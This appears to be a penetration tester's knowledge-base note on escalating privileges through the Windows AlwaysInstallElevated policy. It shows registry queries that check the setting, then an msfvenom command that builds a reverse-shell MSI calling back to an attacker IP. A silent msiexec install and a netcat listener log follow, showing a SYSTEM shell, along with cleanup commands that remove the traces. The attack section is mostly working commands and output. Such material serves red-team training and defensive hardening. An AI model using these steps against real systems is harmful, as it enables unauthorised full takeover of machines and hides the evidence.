# Living off the Land

One of the easiest privilege escalation vulnerabilities related to the group policy settings or the workstation was configured that allows the users to install whatever application that ends with an extension `.msi`. Enumeration is very easy and it doesn't require that much effort to find it. The only thing you should keep in mind that the `REG_DWORD` value is `0x1` does give you an indication that it can be abused from the least privileges.

## 01 - Enumerate

### 1.1 - Command Prompt

```
C:\> reg.exe query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\> reg.exe query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

### 1.2 - PowerShell

```
PS C:\> Get-ItemProperty -Path HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name "AlwaysInstallElevated"

PS C:\> Get-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name "AlwaysInstallElevated"
```

## 02 - Exploit

TODO: In the future create a custom MSI payload.

### 2.2 - Generate a payload via `msfvenom`

We can generate an payload just by using the `-f msi` flag but this type we'll use a different payload module to create a new user account.

```
$ msfvenom -p windows/x64/shell_reverse_tcp lhost=<IP> lport=53 -f msi -o payload.msi
```

Execute the payload.

```
C:\> msiexec /quiet /qn /i payload.msi

$ sudo nc -lnvp 53
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::53
Ncat: Listening on 0.0.0.0:53
Ncat: Connection from 10.10.195.194.
Ncat: Connection from 10.10.195.194:49794.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\> whoami
nt authority\system
```

## 03 - Cleanup

After that clear the trace with the following commands to carry on with the rest of the cyber penetration engagement

```
C:\> msiexec /x payload.msi /q

C:\> del payload.msi
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/File Attachment/Payloads/Desktop/Windows/Installer/MSI|Payload: MSI]]

### Github

- [Mandiant: msi-search](https://github.com/mandiant/msi-search)

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

### Mandiant

- [Mandiant: Escalating Privileges via Third-Party Windows Installers](https://www.mandiant.com/resources/blog/privileges-third-party-windows-installers)

### BadOption

- [MSIFortune - LPE with MSI Installers or MSI - Might (be) stupid idea](https://badoption.eu/blog/2023/10/03/MSIFortune.html)